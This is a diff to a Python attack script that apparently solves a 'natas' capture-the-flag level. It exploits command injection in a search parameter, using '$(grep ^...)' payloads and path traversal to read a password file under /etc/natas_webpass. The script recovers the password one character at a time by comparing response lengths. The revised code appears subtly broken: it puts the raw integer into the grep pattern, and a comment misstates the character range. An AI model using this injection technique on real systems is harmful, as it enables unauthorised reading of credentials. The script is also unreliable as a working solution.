@@ -10,17 +10,24 @@ password = ''
 
 length = 32
 
-print('the password is {} characters long'.format(length))
+# we have to insert a . before each character that we discover in order for this to work
+# essentially, we are testing the following:
+# 'grep ^{}'.format(a)
+# 'grep ^.{}'.format(a)
+# 'grep ^..{}'.format(a)
+# etc, until all 32 characters have been found
 
-#now that we have the length, we need to find each character of the password
+position = '' 
 
-for c in range(1,length+1): #loop for each character in the password
-    for i in range(33,127): #loop for each possible ascii character (33-126 are non-whitespace pw allowable chrs)
-        payload = '?needle=%24%28grep+{}+..%2F..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(c, i)
+for c in range(0,length): #loop for each character in the password
+    print(position)
+    for i in range(48,123): #loop for each possible ascii character (48-123 contains all upper/lowercase letters, and digits)
+        payload = '?needle=%24%28grep+%5E{}{}+..%2F..%2F..%2F..%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search'.format(position, i)
         
-        r = requests.post(url+payload, headers=headers)
-        if 'exists' in r.text:
+        r = requests.get(url+payload, headers=headers)
+        if len(r.text) == 461926:
             password += chr(i)
             break
+    position += '.'
 
 print(password)
